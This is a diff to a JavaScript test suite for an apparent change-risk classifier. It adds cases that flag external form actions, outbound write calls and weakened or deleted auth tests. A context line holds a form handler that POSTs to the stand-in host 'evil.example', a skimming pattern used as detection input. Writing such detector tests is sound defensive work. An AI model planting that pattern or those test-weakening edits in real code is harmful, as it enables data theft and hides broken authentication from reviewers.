@@ -473,6 +473,9 @@ test('a server-side or absolute write call is still an outbound call', () => {
     ['static/app.js', "fetch('/x', {method:'POST'}); requests.post(u)"],
     ['static/app.js', "fetch('/x', {method:'POST'}); fetch(u, {method:'PUT'})"],
     ['templates/pay.html', `<form action="/x" onsubmit="fetch('https://evil.example', {method:'POST'})">`],
+    ['templates/pay.html', '<form method="post" action=" https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post" action="\t//pay.example.com/charge">'],
+    ['static/app.js', 'fetch(`/${host}/x`, {method:"POST"})'],
   ]) {
     const r = outcome(p, { add: [line] });
     assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
@@ -491,6 +494,23 @@ test('a test removed or weakened in a test file named after auth is still tier 2
   assert.equal(tier(file('crates/app/tests/login.rs', { del: ['    assert_eq!(status, 403);'] })), 2);
   assert.equal(tier(file('tests/test_auth.py', { deleted: true, del: ['x = 1'] })), 2);
   assert.equal(tier(file('tests/test_auth.py', { add: ['@pytest.mark.skip'] })), 2);
+  assert.equal(tier(file('tests/test_auth.py', { del: ['    assert r.status_code == 403'], add: ['    assert r.status_code in (200, 403)'] })), 2);
+  assert.equal(tier(file('login_test.go', { del: ['func TestLoginRejectsBadPassword(t *testing.T) {', '\tif ok { t.Fatal("accepted") }', '}'] })), 2);
+  assert.equal(tier(file('tests/login.rs', { del: ['#[tokio::test(flavor = "multi_thread")]', 'async fn rejects_bad_password() {', '    assert!(!ok);', '}'] })), 2);
+  assert.equal(tier(file('tests/session.rs', { del: ['#[sqlx::test]', 'async fn expires(pool: PgPool) {', '    check(pool).await;', '}'] })), 2);
+  assert.equal(tier(file('web/auth.test.ts', { del: ['test.each(cases)("rejects %s", c => {', '  expect(login(c)).toBe(false);', '  expect(audit(c)).toBe(1);', '});'], add: ['expect(login(cases[0])).toBe(false);'] })), 2);
+});
+
+test('an auth-named test file that only drops a literal list item and adds tests stays tier 1', () => {
+  const r = outcome('crates/app/tests/shared_setup_and_login.rs', { del: ['    "/admin/analytics",'], add: ['    "/admin/plan",', '#[tokio::test]', 'async fn plan_page() { assert!(ok); }'] });
+  assert.equal(r.tier, 1, r.reasons.join('; '));
+});
+
+test('a huge line of unclosed form tags is classified quickly', () => {
+  const line = 'method="post" ' + ('<form a=' + 'x'.repeat(50)).repeat(20000);
+  const started = Date.now();
+  outcome('templates/big.html', { add: [line] });
+  assert.ok(Date.now() - started < 2000, `${Date.now() - started} ms`);
 });
 
 test('a file named like a test but not counted as a test keeps the auth rule', () => {
